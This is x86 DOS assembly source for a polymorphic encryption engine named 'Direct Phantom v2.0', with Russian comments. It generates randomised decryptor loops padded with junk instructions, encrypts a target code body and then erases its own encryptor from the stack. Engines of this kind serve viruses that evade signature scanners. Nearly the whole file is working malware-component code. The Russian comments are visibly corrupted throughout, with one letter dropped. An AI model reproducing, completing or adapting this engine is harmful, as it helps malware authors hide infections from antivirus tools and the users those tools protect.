CntF        equ 00000001b   ; счетчик / предел
RMF     equ 00000010b   ; регистр / п мять
UcF     equ 00000100b   ; неизвестное место код 
JRQ     equ 00001000b   ; З прос н  Jxx Imm8
PRQ     equ 00010000b   ; З прос н  Push/Pop
SRQ     equ 00100000b   ; З прос н  Subroutine
CRQ     equ 01000000b   ; Бит р зрешения CALL'ов

REG_AX      equ 0       ; Регистры по порядку
REG_CX      equ 1
REG_DX      equ 2
REG_BX      equ 3
REG_SP      equ 4
REG_BP      equ 5
REG_SI      equ 6
REG_DI      equ 7

PhantomID   db  'Direct Phantom v2.0',0

RND_SEED    db  55h
                     ; 7             0
REG_USED    db  00010000b    ; DI SI BP SP BX DX CX AX
                     ; 7             0
HALF_USED   db  00000000b    ; BH DH CH AH BL DL CL AL

PH_FLAGS    db  CRQ    ; фл ги

BASE_REG    db  0      ; б зовый регистр
KEY_REG     db  0      ; ключ

BASE_RM     db  0      ;  дрес ция через б зу в п мять
BASE_TR     dw  0      ; б з  - init

EncryptPart dw  0      ;  дрес EP в стеке

INITTAB     dw  offset INITBASEOFFS   ; Т блиц  иници лиз ции
        dw  offset INITBASESEG
        dw  offset INITKEY
        dw  offset INITCOUNTER
        dw  offset INITBASESEG
INITFLAGS   db  0
;-----------------------------------------
ImmF        equ 10000000b
KeyF        equ 01000000b

        ; COP , ModeR/M , Flags & Зерк льн я ком нд 

CRYPTTAB    db  11000000b,11000000b,ImmF+3   ; ROL REG/MEM,IMM8
        db  11000000b,11001000b,ImmF+0   ; ROR REG/MEM,IMM8
        db  10000000b,11000000b,ImmF+9   ; ADD REG/MEM,imm8
        db  10000000b,11101000b,ImmF+6   ; SUB REG/MEM,imm8
        db  10000000b,11110000b,ImmF+12  ; XOR reg/mem,imm8

        db  11110110b,11010000b,15       ; NOT reg/mem
        db  11110110b,11011000b,18       ; NEG reg/mem
        db  11111110b,11000000b,24       ; INC reg/mem
        db  11111110b,11001000b,21       ; DEC reg/mem
        db  11010000b,11000000b,30       ; ROL REG/MEM,1
        db  11010000b,11001000b,27       ; ROR REG/MEM,1

        db  00000000b,11000000b,KeyF+36  ; ADD reg/mem,KEY
        db  00101000b,11000000b,KeyF+33  ; SUB reg/mem,KEY
        db  00110000b,11000000b,KeyF+39  ; XOR reg/mem,KEY
ENDCRCMD    equ $

;-----------------------------------------------------------------------------
RND     proc
; dl = RND(0..dl)  получить случ йный б йт

        push    ax
        or  dl,dl            ; RND(0..0)=0
        jz  FinishRND
        push    dx

        inc dl
        jnz NormLimit
        dec dl
NormLimit:
        mov ax,0100h        ; р змер единичного отрезк 
        div dl
        not ah
        push    ax

        in  al,40h       ; RND б йт
        mul [RND_SEED]
        add ax,13849
        mov [RND_SEED],al

        pop dx      ; Биективно отобр зим RND б йт в пределы
        cmp al,dh
        jbe NormByte
        mov al,dh
NormByte:
        xor ah,ah
        div dl
        pop dx
        mov dl,al
FinishRND:
        pop ax
        ret
RND     endp
;-------------------
DROPCOIN    proc
; подбр сыв ние монетки - результ т в ZF
        push    dx
        mov dl,1
        call    RND
        and dl,1
        pop dx
        ret
DROPCOIN    endp
;-------------------
GETNUM      proc
; Exit - RND = 0...dl , al = mask
        call    RND
        mov cl,dl
        mov al,1
        shl al,cl
        ret
GETNUM      endp
;-------------------
GETFREEREG  proc
; CF=0 - регистр
; CF=1 - полурегистр
; Возвр щ ет свободный регистр в DL
        pushf
        push    ax
        push    cx
        jc  HalfReg
NextReg:
        mov dl,7
        call    GETNUM
        test    [REG_USED],al
        jnz NextReg

        or  [REG_USED],al    ; Пометим к к з нятый

        mov cl,al        ; биты 3...0 в 7...0
        shl cl,4         ; для HALF_USED
        and al,0Fh
        or  al,cl
        or  [HALF_USED],al   ; Пометим

        jmp RegDone
HalfReg:
        mov dl,7
        call    GETNUM
        test    [HALF_USED],al
        jnz HalfReg

        or  [HALF_USED],al  ; Пометим к к з нятый
        cmp al,0Fh
        jb  DontRotate
        shr al,4        ; Пометим к к з нятый и в REG_USED
DontRotate:
        or  [REG_USED],al
RegDone:    pop cx
        pop ax
        popf
        ret
GETFREEREG  endp
;-------------------
FREEREG     proc
; Обьвляет регистр свободным
        push    ax
        pushf
        mov al,1
        mov cl,dl
        shl al,cl

        mov cl,al
        not cl

        mov ah,al          ; биты 3...0 в 7...0
        shl ah,4           ; для HALF_USED
        and al,0Fh
        or  ah,al

        popf
        jc  FreeHalfReg

        not ah         ; Освобожд ем регистр и
        and [REG_USED],cl      ; дв  соответствующих полурегистр 
        and [HALF_USED],ah
        jmp EndFreeReg
FreeHalfReg:
        and [HALF_USED],cl     ; Если второй полурегистр свободен
        and ah,[HALF_USED]     ; то освобожд ем регистр
        jnz EndFreeReg
        not al
        and [REG_USED],al
EndFreeReg:
        pop ax
        ret
FREEREG     endp
;-------------------
MAKERM      proc
; Исходя из индексного регистр  в DL дел ет
; соответствующую  дрес цию вп мять
        push    ax
        mov al,00011011b
        cmp dl,REG_BX    ; BX
        jz  RM
        shr al,2
        cmp dl,REG_BP    ; BP
        jz  RM
        shr al,2
        cmp dl,REG_DI    ; DI
        jz  RM

        shr al,2         ; SI
RM:     and al,00000011b
        or  al,00000100b     ; DONE
        mov [BASE_RM],al
        pop ax
        ret
MAKERM      endp
;-------------------
SavePRFX    proc

        cmp [BASE_REG],REG_BP    ; Префикс только перед [BP]
        jne PRFX_OUT

        push    cx
        in  al,40h
        mov cl,al

        mov al,00100110b
RNDPRFX:    xor al,00011000b   ; ES или DS
        loop    RNDPRFX

        stosb              ; DONE
        pop cx
PRFX_OUT:
        ret
SavePRFX    endp
;-------------------
INITBASEOFFS    proc
; б зирует регистр н  криптуемый код
; возможно неизвестное смещение - код ср зу з  декриптором

GetBase:
        clc
        call    GETFREEREG    ; получили б зу

        mov al,1
        mov cl,dl
        shl al,cl
        and al,11101000b ;м ск  индексных регистров : SI,DI,BP,BX
        jnz BASEOK

        clc          ;только индексные
        call    FREEREG
        jmp GetBase
BASEOK:
        mov [BASE_REG],dl     ; з помним
        call    MAKERM        ; сдел ем r/m б йт

        mov al,10111000b      ; mov reg,imm16
        or  al,dl
        stosb

        mov dx,[DEST_CODE]  ; Смещение криптуемого код 
        test    [PH_FLAGS],UcF  ; еще известно - додел ем потом
        jz  make_base   ; DESTCODE будет ср зу з  декриптором

        xor dx,dx       ; пок  б з  0
        mov word ptr [PHTEMP_BASE],di
make_base:
        in  al,40h   ; Словное дополнительное TRASH смещение
        mov ah,al
        in  al,40h

        xchg    ax,dx    ; INITBASE = BASE - TRASH
        sub ax,dx
        mov [BASE_TR],dx
        stosw
        call    TRCHAIN
        ret
INITBASEOFFS    endp
;-------------------
INITBASESEG proc
; Уст новим ES,DS = CS
        mov dh,00011000b       ; ES или DS
DEST_SREG   equ $ - 1

        mov dl,00001000b       ; CS
        call    MAKESEGREG
        xor byte ptr [DEST_SREG],00011000b

        ret
INITBASESEG endp
;-------------------
MAKESEGREG  proc
; dh - destination sreg      Моделируется : PUHS SRC  или  MOV REG,SRC
; dl - source sreg              POP DEST       MOV DEST,REG

        call    DROPCOIN    ; подбросим монетку
        jz  SECONDPART

        mov al,00000110b      ; PUSH SREG
        or  al,dl         ; + SOURCE
        stosb
        call    TRCHAIN

        xor al,dl         ; сбросим SOURCE
        or  al,1          ; + POP
        or  al,dh         ; + DESTINATION
        stosb
        jmp DoneSreg
SECONDPART:
        mov ax,1100000010001100B      ; MOV REG,SREG
        or  ah,dl
        clc
        mov cl,dl
        call    GETFREEREG
        xchg    cl,dl
        or  ah,cl         ; промежуточный регистр
        stosw
        call    TRCHAIN

        xor ah,dl         ; сбросим SOURCE
        or  al,2          ; Set Dbit - MOV SREG,AX
        or  ah,dh         ; + DESTINATION
        or  ah,cl         ; + промежуточный регистр
        stosw

        mov dl,cl         ; свободен для д льнейшего
        clc
        call    FREEREG

DoneSreg:   call    TRCHAIN
        ret
MAKESEGREG  endp
;-------------------
INITKEY     proc
        in  al,40h      ; ключ
        mov ah,al
        mov al,10110000b    ; MOV REG,IMM8
        stc
        call    GETFREEREG  ; с м регистр
        mov [KEY_REG],dl    ; он н м еще будет нужен
        or  al,dl
        stosw
        call    TRCHAIN
        ret
INITKEY     endp
;-------------------
INITCOUNTER proc
        call    DROPCOIN    ; огр ничив ние криптуемого код  -
        jz  CodeLimit   ; ср внив ние с пределом

        clc         ; сдел ем счетчик
        call    GETFREEREG
        mov byte ptr [CNT_REG],dl
        mov al,10111000b
        or  al,dl
        stosb

        mov ax,[counter]
        stosw
        or  [PH_FLAGS],CntF    ; огр ничив ние по счетчику
        call    TRCHAIN        ; DEC CNT
CodeLimit:
        xor [PH_FLAGS],CntF    ; огр ничив ние по пределу
        ret            ; CMP BASE,DESTCODE+COUNTER
INITCOUNTER endp
;-------------------
INITPHANTOM proc
;Иници лиз ция всех п р метров в произвольном порядке

        call    DROPCOIN      ;криптов ние REG/MEM ?
        jz  CRYPTTYPE

        or  [PH_FLAGS],RMF    ; криптов ние непосредственно
                      ; в п мять
CRYPTTYPE:
        cmp [DEST_CODE],0FFFFh   ; DEST_CODE неизвестно
        jne fixed            ; будет ср зу з  декриптором

        or  [PH_FLAGS],UcF       ; уст новим Unknown Code Flag
fixed:

; Последов тельный RND вызов процедур н стройки п р метров

        mov dl,4
NextProc:
        push    dx
        call    GETNUM
        shl dl,1
        movzx   bx,dl    ; index в т блице  дресов процедур

        test    [INITFLAGS],al
        jnz ThisProcIsDone    ; Уже был  выполнен 

        or  [INITFLAGS],al        ; Пометим
        call    [BX+offset INITTAB]   ; Выполним
        pop dx
        jmp NextProc
ThisProcIsDone:
        cmp [INITFLAGS],1Fh   ; все процедуры выполнены ?
        pop dx
        jne NextProc
        ret
INITPHANTOM endp
;-------------------
ENCRYPT     proc
; Генерирует ком нды з грузки/сохр нения б йт  из криптуемого код ,если RmF=0
; Генерирует последов тельность р сшифровыв ющих ком нд - DecryptPart ,
; п р ллельно в стеке генерится зерк льн я последов тельность - EncryptPart
; для последующей з шифровки код 

        pop word ptr [CryptExit]

        mov word ptr [PH_LABEL],di   ; метк  дл  переход 
        call    TRCHAIN          ; р зб вим дерьмом

        test    [PH_FLAGS],RMF  ; не н до з грузки б йт  в TMP_REG
        jnz MEMCRYPT

; Моделируем З грузку б йт  из код 
        stc
        call    GETFREEREG
        mov byte ptr [TMP_REG],dl

        call    SavePRFX         ; Если нужно сдел ем префикс

                         ; для ком нды сохр нения б йт 

        mov word ptr [LoadSaveCMD],di


        mov al,10001010b       ; MOV REG,R/M
        stosb

        mov al,10000000b       ; б йт ModeR/M

        shl dl,3           ; + TMP_REG
        or  al,dl          ; +  дрес цию в п мять
        or  al,[BASE_RM]
        stosb

        mov ax,[BASE_TR] ; + мусор - REALBASE = INIT + TRASH
        stosw
        call    TRCHAIN
MEMCRYPT:
; Генерим EN/DEcryptionPart
        mov word ptr [CRYPTLAB],di
        ; В [CRYPTLAB] будет помещен JMP в DecryptPart

        call    RMTRASH
        call    SimplyTRASH ; Поверьте т к н до...
        call    RMTRASH

        mov si,offset CRYPTTAB

        mov dl,8      ; криптующих ком нд : RND (8...16)
        call    RND
        add dl,8
        mov cl,dl
        xor ch,ch
                        ; STKFRM - р змер DecPart в стеке
        mov word ptr [STKFRM],6 ; Пок  только д льний JMP

        push    es  ; Seg:Offs Decryptor'a
        push    ax
        mov word ptr [OffsFARJump],sp  ; Для смещения - оно
                           ; еще не известно

        mov ax,0EA90h     ; Far Jump обр тно в декриптор
        push    ax

MAKE_CRYPT_CMD:

        mov dl,(ENDCRCMD-CRYPTTAB)/3-1
        call    RND
        xchg    al,dl
        mov dl,3         ; индекс ком нды в т блице
        mul dl
        mov bx,ax

        mov ax,9090h     ; Stack Frame for THIS command
        push    ax
        push    ax
        push    ax
        add word ptr [STKFRM],6  ; увеличим
        mov bp,sp

        test    [PH_FLAGS],RMF  ; Нужен префикс ? (если в п мять)
        jz  DoNotPRFX
        call    SAVEPRFX
        mov byte ptr [bp],26h     ; И в stack frame
        inc bp
DoNotPRFX:
        mov ax,[si+bx]
        stosb           ; КОП
        mov al,ah       ; ModeR/M б йт

        mov ah,bl
        mov bl,[si+bx+2]
        and bl,00111111b
        mov dx,[si+bx]  ; код зерк льной ком нды
        mov bl,ah

        mov [bp],dl
        inc bp

        test    byte ptr [si+bx+2],KeyF ; не доб влять ключ
        jz  DontAddKEY

        mov dl,[KEY_REG]    ; + KEY_REG
        shl dl,3
        or  al,dl       ; This COP
        or  dh,dl       ; COP в stack frame
DontAddKEY:
; добaвление п мяти или TMP_REG'a

        mov ah,00h
TMP_REG     equ $ - 1
        test    [PH_FLAGS],RMF
        pushf
        jz  AddTMP

        mov ah,[BASE_RM]
        and al,10111111b   ; MODE = [mem+imm16]
        and dh,10111111b
AddTMP:
        or  al,ah          ; COP's Done
        or  dh,ah
        stosb
        mov [bp],dh
        inc bp

        popf
        jz  AddIMM8

        mov ax,[BASE_TR]   ; + мусор (к к при з грузке б йт )
        stosw
        mov   [bp],ax
        inc   bp
        inc   bp
AddIMM8:
        test    byte ptr [si+bx+2],ImmF
        jz  CRCMD_DONE         ; Immediate8  не н до

        in  al,40h
        stosb
        mov [bp],al   ; B stack frame

CRCMD_DONE:
        call    TRCHAIN     ; Следующую ком нду
        dec cx
        jne MAKE_CRYPT_CMD

        mov bp,0000h   ; выход из stackframe в DECRYPTOR
OffsFARJump equ $ - 2
        mov [bp],di

        mov [EncryptPart],sp

        test    [PH_FLAGS],RMF
        jnz DontMakeSaveCMD

        call    SAVEPRFX      ; Сдел ем ком нду сохр нения б йт  -
        mov bx,0000h      ; возьмем ком нду з грузки и
LoadSaveCMD equ $ - 2         ; сбросим Direction bit
        mov eax,es:[bx]
        and al,11111101b

        stosd             ; Done

        call    TRCHAIN
DontMakeSaveCMD:
        mov ax,0000h
CryptExit   equ $ - 2

        push    ax
        ret
ENCRYPT     endp
;-------------------
CHANGECNT   proc

        call    DROPCOIN
        jz  second

        mov al,01000000b
        or  al,[BASE_REG]
        stosb
        jmp ChangeEndCrypt
second:
        mov ax,1100000010000011b    ; ADD/SUB BASE,imm8
        or  ah,[BASE_REG]

        call    DROPCOIN
        jz  met

        xor byte ptr [IncDec],00001000b
        or  ah,00101000b
met:
        stosw
        push    ax
        in  al,40h
        and al,3Fh
        mov dl,al
        stosb
        pop ax

        call    TRCHAIN

        dec dl
IncDec      equ $ - 1
        xor ah,00101000b
        stosw
        mov al,dl
        stosb

        or  byte ptr [IncDec],00001000b
ChangeEndCrypt:
        call    TRCHAIN

        test    [PH_FLAGS],CntF
        jnz Limit_

        mov al,01001000b
        or  al,00h
CNT_REG     equ $ - 1
        stosb
        jmp   endchange
Limit_:
        mov ax,1111100010000001b
        or  ah,[BASE_REG]
        stosw
        mov ax,[DEST_CODE]
        inc ax
        test    [PH_FLAGS],UcF
        jnz unk
        dec ax
unk:
        sub ax,[BASE_TR]
        mov word ptr [PHTEMP_CNT],di
        add ax,[COUNTER]
        stosw
endchange:
        ret
CHANGECNT   endp
;-------------------
MAKEJNE     proc

        mov dx,di
        inc dx
        inc dx
        sub dx,1234h
PH_LABEL    equ $ - 2
        cmp dx,80h      ; Не выходит ли з  пределы 128 б йт
        jb  REL8bit
        inc dx
        inc dx
        mov ax,850Fh    ; JNE Rel16
        stosw
        xchg    ax,dx       ; и смещение
        neg ax
        stosw
        jmp EndJNE
REL8bit:
        mov al,75h      ; сдел ем короткий
        stosb
        xchg    al,dl
        neg al
        stosb
EndJNE:
        ret
MAKEJNE     endp
;-----------------------------------------------------------------------------
PHANTOM     proc

; Структур  з полняем я для вызов  PHANTOM
;    RELOFFS      - TARGETOFFS + RELOFFS = ре льное место выполнения
;    DEST_CODE    -  дрес криптуемого код 
;    COUNTER      - длинн  код 
;    TARGETPLACE      - место для декриптор 
;    LENDECRYPTOR     - длинн  декриптор  (генерится)

; Иници лиз ция
        pop word ptr [EXPHANTOM]
        cli

        mov [PH_FLAGS],CRQ    ; З прещены CALL'ы

        xor al,al
        mov [INITFLAGS],al
        mov [HALF_USED],al
        mov [REG_USED],00010000b

        dec al
        movsx   eax,al
        mov dword ptr [SUBOFFS],eax
        mov dword ptr [SUBOFFS+4],eax

        les di,[TARGETPLACE]    ; Куд  будем генерить
        cld

        call    TRCHAIN

        call    INITPHANTOM ; Part 1 - иници лиз ция регистров
        call    ENCRYPT     ; Part 2 - GEN EN/DEcryptionPart
        call    CHANGECNT   ; Part 3 - изменение счетчиков
        call    MAKEJNE     ; Part 4 - циклический переход

        mov word ptr [ENDLOOP],di
        ; Для з шифровыв ния используется тот же декриптор -
        ; DI -  дрес для временного RETF

        call    TRCHAIN

        test    [PH_FLAGS],UcF
        jz  DONTADDOFFS
        mov [DEST_CODE],di      ; дел ем Relative DEST_CODE
        call    ADDREALPLACE
DONTADDOFFS:
        mov ax,di
        sub ax,word ptr [TARGETPLACE]
        mov [LENDECRYPTOR],ax   ; Длинн  декриптор 

        sti
        mov ax,0000h
EXPHANTOM   equ $ - 2
        push    ax
        ret
PHANTOM     endp
;-------------------
JuNK_DOIT   proc
; З шифровк  код  и уд ление EncryptionPart
        cli
        pop word ptr [EXJUNK]

        push    es
        pop ds

        mov si,0000h   ; Сдел ем временный возвр т
ENDLOOP     equ $ - 2
        mov dh,0CBh
        xchg    [si],dh

        mov bx,0000h
CRYPTLAB    equ $ - 2
                   ; Сдел ем jmp SS:EncryptChain
        mov dl,0EAh
        mov ax,ss      ; Сегмент стек 
        rol eax,16
        mov ax,cs:[EncryptPart]   ; Смещение

        xchg    [bx],dl
        xchg    [bx+1],eax

        push    si
        push    bx
        push    dx
        push    eax

        call    cs:[TARGETPLACE]

        pop eax
        pop dx
        pop bx
        pop si

        mov [si],dh      ; восст новим все что поменяли
        mov [bx],dl
        mov [bx+1],eax

        push    cs
        pop ds

        mov di,[RELOFFS]   ; Сдел ем Ре льное смещение
        call    ADDREALPLACE

        push    ss
        push    ss
        pop es
        pop ds

        mov dx,0000h
StkFrm      equ $ - 2

        mov di,sp
        mov si,sp
        mov cx,cs:[EncryptPart]

        add di,dx
        sub cx,sp
Move:
        jcxz    EndMoveStk
        movsb
        dec cx
        jmp Move
EndMoveStk:
        add sp,dx

        push    cs
        push    cs
        pop es
        pop ds

        sti
        mov ax,0000h
EXJUNK      equ $ - 2
        push    ax
        ret
JuNK_DOIT   endp
;-------------------
ADDREALPLACE    proc
        mov bx,1234h
PHTEMP_BASE equ $ - 2
        add es:[bx],di

        test    [PH_FLAGS],CntF
        jz  NOTLIMIT

        mov bx,1234h
PHTEMP_CNT  equ $ - 2
        add es:[bx],di
NOTLIMIT:
        ret
ADDREALPLACE    endp

